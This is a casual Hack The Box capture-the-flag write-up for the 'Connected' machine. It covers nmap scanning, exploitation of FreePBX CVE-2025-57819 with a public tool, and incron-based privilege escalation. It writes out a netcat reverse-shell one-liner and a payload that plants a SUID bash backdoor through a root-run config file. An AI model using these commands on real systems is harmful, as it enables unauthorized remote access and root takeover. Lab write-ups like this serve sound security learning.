***Step 1:*** To start things off, I started enumerating the target with the following command in nmap: 

```
sudo nmap -p- -T4 [target ip_addr] -Pn --disable-arp-ping --stats-every=5s
```

This allowed me to get the following information:
- Port 80 is open (meaning that a website is most likely being run)
- Port 22 is open (meaning it allows remote access)
- Port 443 is open 


***Step 2:*** I proceeded to gather more information using the nmap script and version grabber:
```
nmap -p 80 -sC -sV 10.129.245.100 --stats-every=5s
```

Which gave me the following information:
```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
|_http-title: Did not follow redirect to http://connected.htb/

```

This can be useful as I could probably search some exploits for the version of Cent-OS the target had. However, during the time of this write up, there were mostly already made write ups about the lab instead of exploits and I didn't want to cheat or look for help just yet so I just leave this here for now. 
*(The most useful part from this is the "http://connected.htb/" as it is going to be used for manual domain resolution)*


Step 3: I opened tried looking up what was happening in the website but it didn't work so I had to manually write and change the `/etc/hosts` file in order to resolve the IP_addr to the website domain.


---

*Side notes: I additionally noticed that the website contained .PHP so it could be assumed that the website could probably contain some sort of uploading vulnerability which could maybe used for reverse shell???*

---


Step 4: I noticed that the website contains a login which knowing HTB could be used to abused to gain some sort of admin access? (I hope we don't have to do some sort of SQL injection. I'm still new to this stuff man...):

![](Pics/Pasted%20image%2020261014221414.png)


The website has a bunch of interesting options as you can see: 

![[Pasted image 20261014222027.png]]


From this point on I struggled a fuck ton . So I just started looking around until I encountered the version of the software (chill out on me I'am still getting used to doing this stuff...): 
![[Pasted image 20261018205544.png]]


Step 5: This gave me the idea to search for "FreePBX 16.0.x.x Exploits", in which I successfully encountered a two important CVEs. 


CVE-2025-57819 and  CVE-2025-61675. To keep it short, the first CVE is a **authentication bypass vulnerability** while the second one is a **SQL injection vulnerability**.


I managed to get my hands on a exploit linked by the NIST website (https://github.com/watchtowrlabs/watchTowr-vs-FreePBX-CVE-2025-57819) *Shutout to this dude for letting me steal... I mean use his exploit.* 


After starting up the tool and using it based on the page's argument manual, I managed to get a URL *(it is given in the "VULNERABLE"  section)*:

![[Pasted image 20261018211237.png]]


From my understanding is location where I can input regular terminal syntax with the only difference of it being on a website: 


*Yk what ?  from this point on this is going to be more like a blog than a walk through cuz I don't know how to label steps from this point on as it is all over the place (I will improvise in the future, trust.)*

![[Pasted image 20261018211023.png]]

As you can see, I just typed "echo" as if the regular terminal meaning I'am successfully able to execute code remotely. 


However I need a proper terminal control so I used a revere shell from this point on to gain terminal access to the target from my computer.

I used the following reverse shell from a website:

```
nc -c sh {Local IP_addr} {Local_port}
```


![[Pasted image 20261018211919.png]]


Then, I upgraded the TTY to a better one with a command I searched online.
(the system didn't have python so I couldn't upgrade it with the one command I knew)

```
#tty upgrade syntax

script -qc /bin/bash /dev/null
```


![[Pasted image 20261018212107.png]]



Alright. Now that I got a interactive terminal, I was ready to get the user flag.


I tried using the typical command:

```
find / "user.txt" 2>/dev/null
```


Idk what happened but my shit started spitting out paths violently:

![[Pasted image 20261018212732.png]]


So I just stuck to the method of manually going to the home directory and found the user flag...

![[Pasted image 20261018214636.png]]
(can't show the flag cuz of the policy)



---


# Getting root access....

![[Pasted image 20261018213549.png]]

First thing that came to my mind was checking crontab jobs as I remembered it being mentioned on some of the websites about FreePBX vulnerably:

![[Pasted image 20261018214159.png]]

Not too surprisingly, there were a bunch of cron jobs assigned that I could take a look at and hopefully exploit it...


---


Alright. After this point, I tried every sing privilege escalation method I knew, checking sudo -l, env files, $PATH. etc...Nothing gave me a clue on moving forward. I was stuck for 4 days (no jokes), so I 
took a peek at a write-up.

As expected, the approach was something new to me...


I was supposed to check the following path:

```
/etc/incron.d/*
```

Incron, from my understanding (could be wrong) is another variation of cron, in which it runs a script based on a certain condition made on a file/path, (such as editing, modifying and closing a file, etc..) instead of time based like regular cron. 

I was supposed to look at the following suspicious configuration of incron: 

```
var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart
```



when looking at the `sysadmin_dahdi_restart` script, you can see the following:

![[Pasted image 20261101145344.png]]

The interesting part in this picture is the script executed with restart.

If we can see a configuration for that file, we can escalate permissions. 

When searching through the /etc/init.d/dahdi, a script using a dot command can be found, where it grabs `/etc/dahdi/init.conf` and copies its script and adds it the main script. The file is editable for the asterisk user (target) meaning that if the .conf is modified, it will execute with root privilege. 

Running the following payload which creates a backdoor with root perms and triggering condition I managed to get root access.

```
printf '\n install -m 4755 /bin/bash /home/asterisk/pwn1 \n' >> /etc/dahdi/init.conf  

touch /var/spool/asterisk/sysadmin/dahdi_restart
```

![[Pasted image 20261101164444.png]]



---


**COMMENTS (Toughs):**

As mentioned before, getting Privilege escalation in my opinion was the most time consuming and hard part of this box. I also have to take into account that the lack of knowledge about incron is the reason for me getting stuck for days but, hey I learned a handful from it.

I also want to admit that I kinda got a bit lazy when documenting the root access part and I believe it's kind of noticeable. I will try getting used to documenting and doing write-ups as I will do more of them on the future.


**NOTES (Stuff I learned):**
- What incron is - another variety of cron, where running scripts are decided by certain conditions (ex: modifying files).

- Actions in the `/etc/incron.d` are always executed as root.

- I need to be more conscious about `.conf` files as sometimes it can be modifiable by regular users but pulled out and used with root or higher perms, allowing opportunities for privesc.


**Write-up Source that I used for peeking:**
https://1nf1n1ty.medium.com/connected-htb-writeup-or-the-time-a-signature-check-actually-did-its-job-and-i-had-to-find-plan-5d6fe9f18772
